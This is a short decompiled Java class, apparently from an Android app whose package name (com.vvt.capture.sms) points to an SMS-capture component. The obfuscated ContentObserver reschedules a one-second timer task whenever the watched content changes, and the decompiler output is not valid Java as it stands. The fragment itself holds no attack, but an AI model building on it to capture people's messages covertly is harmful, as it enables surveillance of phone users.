package com.vvt.capture.sms.b;

import android.database.ContentObserver;
import android.os.Handler;
import java.util.Timer;
import java.util.TimerTask;

class d
  extends ContentObserver
{
  d(c paramc, Handler paramHandler)
  {
    super(paramHandler);
  }
  
  public void onChange(boolean paramBoolean)
  {
    Object localObject1 = b.a(this.a.b);
    if (localObject1 != null)
    {
      localObject1 = b.a(this.a.b);
      ((Timer)localObject1).cancel();
      boolean bool = b.a();
      if (!bool) {}
    }
    localObject1 = this.a.b;
    Object localObject2 = new java/util/Timer;
    ((Timer)localObject2).<init>();
    b.a((b)localObject1, (Timer)localObject2);
    localObject1 = b.a(this.a.b);
    localObject2 = new com/vvt/capture/sms/b/e;
    ((e)localObject2).<init>(this);
    ((Timer)localObject1).scheduleAtFixedRate((TimerTask)localObject2, 0L, 1000L);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */